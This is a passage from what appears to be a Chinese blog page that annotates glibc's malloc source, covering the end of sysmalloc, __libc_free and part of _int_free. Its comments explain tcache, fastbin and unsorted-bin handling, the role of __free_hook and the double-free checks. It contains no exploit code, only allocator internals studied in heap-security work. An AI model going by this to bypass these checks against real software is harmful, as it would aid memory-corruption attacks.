(MORECORE_FAILURE))<br>            set_head (old_top, (size + old_size) | PREV_INUSE);<br>            <span class="hljs-comment">//  这表示扩建top chunk成功</span><br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)<br>    malloc_printerr (<span class="hljs-string">&quot;break adjusted to free malloc space&quot;</span>);<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">               当新获取的内存结尾地址，在之前的结尾地址前面，表示出错了</span><br><span class="hljs-comment">              中断程序</span><br><span class="hljs-comment">            */</span><br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              <span class="hljs-comment">/* 这表示新的内存创建成功</span><br><span class="hljs-comment">                且与之前使用的空间不连续 */</span><br>              front_misalign = <span class="hljs-number">0</span>;<br>              end_misalign = <span class="hljs-number">0</span>;<br>              correction = <span class="hljs-number">0</span>;<br>              aligned_brk = brk;<br>              <span class="hljs-keyword">if</span> (contiguous (av))<br>                &#123; <span class="hljs-comment">// 当需要当前分配区中的空间连续时</span><br><br>                  <span class="hljs-keyword">if</span> (old_size)<br>                    <span class="hljs-comment">/* 当 当前没有在初始化分配区时</span><br><span class="hljs-comment">                        修改使用的系统内存大小 </span><br><span class="hljs-comment">                        这里默认空间为连续内存空间*/</span><br>                    av-&gt;system_mem += brk - old_end;<br>                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK; <span class="hljs-comment">// 检测当前空间结尾是否对齐</span><br>                  <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                    &#123; <br>                      correction = MALLOC_ALIGNMENT - front_misalign;<br>                      aligned_brk += correction;<br>                      <span class="hljs-comment">/*</span><br><span class="hljs-comment">                        对齐当前分配区占用内存空间</span><br><span class="hljs-comment">                      */</span><br>                    &#125;<br>                  correction += old_size;<br>                  end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);<br>                  correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;<br>                  assert (correction &gt;= <span class="hljs-number">0</span>);<br>                  snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (correction));<br>                      <span class="hljs-comment">/* 补齐内存空间 防止存在非连续内存空间*/</span><br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                    &#123; <span class="hljs-comment">/* 当分配失败时，停止尝试，仅获取当前使用的内存结尾 */</span><br>                      correction = <span class="hljs-number">0</span>;<br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>                      <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>                        (*hook)();<br>                        <span class="hljs-comment">// 进行分配成功后的处理，一般hook==NULL</span><br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  <span class="hljs-comment">/* 仅检测内存空间是否对齐 */</span><br>                  <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>                    assert (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;<br>                      <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>)<br>                        &#123;<br>                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;<br>                        &#125;<br>                    &#125;<br>                  <span class="hljs-keyword">if</span> (snd_brk == (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                    &#123;<br>                      snd_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">if</span> (snd_brk != (<span class="hljs-type">char</span> *) (MORECORE_FAILURE))<br>                &#123;<br>                  <span class="hljs-comment">/* 当获取内存结束空间地址成功时 </span><br><span class="hljs-comment">                      设置新的heap与新的top chunk</span><br><span class="hljs-comment">                      并释放老的top chunk</span><br><span class="hljs-comment">                  */</span><br>                  av-&gt;top = (mchunkptr) aligned_brk;<br>                  set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);<br>                  av-&gt;system_mem += correction;<br>                  <span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)<br>                    &#123;<br>                      old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;<br>                      set_head (old_top, old_size | PREV_INUSE);<br>      set_head (chunk_at_offset (old_top, old_size),<br>(<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>      set_head (chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ),<br>(<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE);<br>                      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)<br>                        &#123;<br>                          _int_free (av, old_top, <span class="hljs-number">1</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) av-&gt;system_mem &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (av-&gt;max_system_mem))<br>    av-&gt;max_system_mem = av-&gt;system_mem;<br>   <span class="hljs-comment">// 更新当前最大使用到的系统内存大小</span><br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    先检测当前分配区是否合法，然后将用户需要的chunk创建好，并返回给用户</span><br><span class="hljs-comment">  */</span> <br>  check_malloc_state (av);<br>  p = av-&gt;top;<br>  size = chunksize (p);<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>    &#123;<br>      remainder_size = size - nb;<br>      remainder = chunk_at_offset (p, nb);<br>      av-&gt;top = remainder;<br>      set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>      set_head (remainder, remainder_size | PREV_INUSE);<br>      check_malloced_chunk (av, p, nb);<br>      <span class="hljs-keyword">return</span> chunk2mem (p);<br>    &#125;<br>  __set_errno (ENOMEM);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="释放">释放</h2><h3 id="libc-free">__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <br>  <br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 检测__free_hook中是否储存了函数地址，</span><br>          <span class="hljs-comment">// 当存在时执行函数，将指向的函数作为释放free函数执行</span><br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)   <span class="hljs-comment">// 防止释放空指针</span><br>    <span class="hljs-keyword">return</span>; <br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <br>    &#123;<br>      <span class="hljs-comment">// 当chunk由mmap分配时</span><br>      <span class="hljs-comment">// 设置mmap的各项参数，然后执行munmap，释放chunk</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>          &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX<br>  &amp;&amp; !DUMPED_MAIN_ARENA_CHUNK (p))<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      <br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  MAYBE_INIT_TCACHE (); <br>  <span class="hljs-comment">/* 当tcache bins没有初始化时，</span><br><span class="hljs-comment">      对tcache bins进行初始化操作</span><br><span class="hljs-comment">        也就是从堆空间中获取一段空间，用于tcache bins*/</span><br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">      #define  TCACHE_MAX_BITS 64</span><br><span class="hljs-comment">      typedef struct tcache_perthread_struct</span><br><span class="hljs-comment">      &#123;</span><br><span class="hljs-comment">        uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="hljs-comment">        tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="hljs-comment">      &#125; tcache_perthread_struct;</span><br><span class="hljs-comment">      那么tcache bins占用的空间大小就是 640==0x280</span><br><span class="hljs-comment">      那么tcache bins所在chunk占用的空间就是0x290,位于heap段开头</span><br><span class="hljs-comment">  */</span><br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>  <span class="hljs-comment">/* 获取chunk所在分配区，调用_int_free函数释放p */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-free">_int_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;<br>  mfastbinptr *fb;<br>  mchunkptr nextchunk;<br>  INTERNAL_SIZE_T nextsize;<br>  <span class="hljs-type">int</span> nextinuse;<br>  INTERNAL_SIZE_T prevsize;<br>  mchunkptr bck;<br>  mchunkptr fwd;<br>  size = chunksize (p);<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;free(): invalid pointer&quot;</span>) ;<br>    <span class="hljs-comment">//检测chunk的地址是否合法</span><br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    malloc_printerr (<span class="hljs-string">&quot;free(): invalid size&quot;</span>);<br>    <span class="hljs-comment">//检测chunk的size是否合法</span><br>  check_inuse_chunk(av, p);<br>    <span class="hljs-comment">/* 检测下一个chunk的inuse位是否为 1</span><br><span class="hljs-comment">        若不为1，则表示当前chunk，在之前已经被释放过了，</span><br><span class="hljs-comment">        这次释放属于程序错误</span><br><span class="hljs-comment">    */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-comment">// 当程序开启了tcache bin时</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      先获取chunk size对应的tcache bin</span><br><span class="hljs-comment">      然后检测对应的tcache bin是否存满 默认每个tcache bin可以储存7个chunk</span><br><span class="hljs-comment">      当没有存满时，直接将当前chunk放入对应的tcache bin中</span><br><span class="hljs-comment">      并结束释放</span><br><span class="hljs-comment">      </span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br><br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br><br><br>  &#125;<br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br><br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          当chunk的size符合fast bin的条件</span><br><span class="hljs-comment">          且当前chunk不为top chunk</span><br><span class="hljs-comment">        */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))<br>  &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br>         <span class="hljs-comment">// 检测下一个chunk是否合法</span><br>         <span class="hljs-comment">// 用来判断当前heap段是否为人为伪造的</span><br><span class="hljs-type">bool</span> fail = <span class="hljs-literal">true</span>;<br><br><span class="hljs-keyword">if</span> (!have_lock)<br>  &#123;<br>    <span class="hljs-comment">/* 当程序不存在锁时</span><br><span class="hljs-comment">          检测可能存在问题，获取程序锁，再次检测下一个chunk是否合法</span><br><span class="hljs-comment">      */</span><br>    __libc_lock_lock (av-&gt;mutex);<br>    fail = (chunksize_nomask (chunk_at_offset (p, size)) &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem);<br>    __libc_lock_unlock (av-&gt;mutex);<br>  &#125;<br><span class="hljs-keyword">if</span> (fail)<br>  malloc_printerr (<span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>);<br>      &#125;<br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>    <span class="hljs-comment">// 设置chunk的数据段</span><br><br>    atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">// 检测fast bin是否合法</span><br>    <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br>    <span class="hljs-comment">// 尝试将chunk放入fast bins中</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      old为当前fast bin中第一个成员</span><br><span class="hljs-comment">      fast bin中获取chunk的顺序为 先入后出，后入先出</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>      &#123;<br>   <span class="hljs-comment">// 当仅有一个线程时，直接将当前chunk放入fast bin中</span><br><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br><br>p-&gt;fd = old;<br>*fb = p;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-keyword">do</span><br>&#123;    <span class="hljs-comment">// 当存在多线程时，通过循环获取当前线程的fast bin</span><br>      <span class="hljs-comment">// 并将当前chunk放入当前线程的fast bin中</span><br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      <span class="hljs-comment">/* 检测fast bin的开头是否为当前chunk，如果是则中断程序 */</span><br>    malloc_printerr (<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>  p-&gt;fd = old2 = old;<br>&#125;<br>      <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))<br>     != old2);<br><br>    <br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span><br>&amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="hljs-number">0</span>))<br>      <span class="hljs-comment">//检测当前线程的fast bin是否被修改</span><br>      malloc_printerr (<span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>); <br><br>  &#125;<br><br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-comment">// 当chunk不是由mmap分配的时</span><br><br>    <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>      have_lock = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!have_lock)<br>      __libc_lock_lock (av-&gt;mutex);<br>    nextchunk = chunk_at_offset(p, size);<br><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>      malloc_printerr (<span class="hljs-string">&quot;double free or corruption (top)&quot;</span>);<br>      <span class="hljs-comment">//禁止释放当前在使用的top chunk</span><br><br>    <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br>      <span class="hljs-comment">/* 检测下一个chunk的地址是否合法</span><br><span class="hljs-comment">          在程序指定需要连续的空间的情况下，</span><br><span class="hljs-comment">          下一个chunk的地址必须要在heap段中</span><br><span class="hljs-comment">      */</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>      malloc_printerr (<span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>);<br>      <span class="hljs-comment">/* 检测下一个chunk的inuse位是否为0</span><br><span class="hljs-comment">        为0表示当前chunk是被释放过的</span><br><span class="hljs-comment">      */</span><br>    nextsize = chunksize(nextchunk);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      malloc_printerr (<span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>);<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">          判断下一个chunk的size是否合法</span><br><span class="hljs-comment">      */</span><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br>      <span class="hljs-comment">// 设置当前chunk中的数据</span><br><br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">        如果当前chunk的inuse位为0，则表示前一个chunk是被释放过的</span><br><span class="hljs-comment">        可以进行合并操作</span><br><span class="hljs-comment">     */</span><br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          如果前一个chunk被释放过，</span><br><span class="hljs-comment">          那么当前chunk的prev_size段储存的就是前一个chunk的size</span><br><span class="hljs-comment">          如果条件不成立，则表示程序出现了问题</span><br><span class="hljs-comment">        */</span><br>        malloc_printerr (<span class="hljs-string">&quot;  while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>        <span class="hljs-comment">// 如果下一个chunk不是topchunk，则获取下一个chunk后一个chunk的inuse位</span><br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>unlink_chunk (av, nextchunk);<br>    <span class="hljs-comment">//如果下一个chunk的后一个chunk的inuse位为0，则将当前chunk与下一个chunk合并</span><br>size += nextsize;<br>      <br>      &#125; <span class="hljs-keyword">else</span><br>clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>      <span class="hljs-comment">// 如果没到到当前chunk与下一个chunk合并的条件，则设置下一个chunk的inuse位为0</span><br><br>      bck = unsorted_chunks(av); <br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>malloc_printerr (<span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>);<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-comment">// 先检测unsorted bin的结构是否错误</span><br>      <span class="hljs-comment">// 然后获取unsorted bin的开头和结尾</span><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size))<br>&#123;<br>  p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>  p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      large bin 中chunk的结构为</span><br><span class="hljs-comment">       prev_size   size</span><br><span class="hljs-comment">       fd          bk</span><br><span class="hljs-comment">       